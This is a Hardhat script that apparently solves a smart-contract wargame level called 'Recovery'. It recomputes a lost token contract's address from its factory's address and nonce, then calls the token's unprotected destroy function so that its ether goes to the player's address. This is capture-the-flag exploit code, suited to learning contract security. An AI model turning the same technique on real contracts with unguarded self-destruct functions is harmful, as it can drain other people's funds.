import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x524F04724632eED237cbA3c37272e018b3A7967e"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {

    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Recovery", CONTRACT_ADDRESS, signer)



    const recomputedContractAddress = ethers.utils.getContractAddress({
        from: contract.address,
        nonce: ethers.BigNumber.from(`1`),
    })
    const tokenContract = await ethers.getContractAt("SimpleToken", recomputedContractAddress, signer)
    await tokenContract.destroy(PLAYER_ADDRESS)

}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});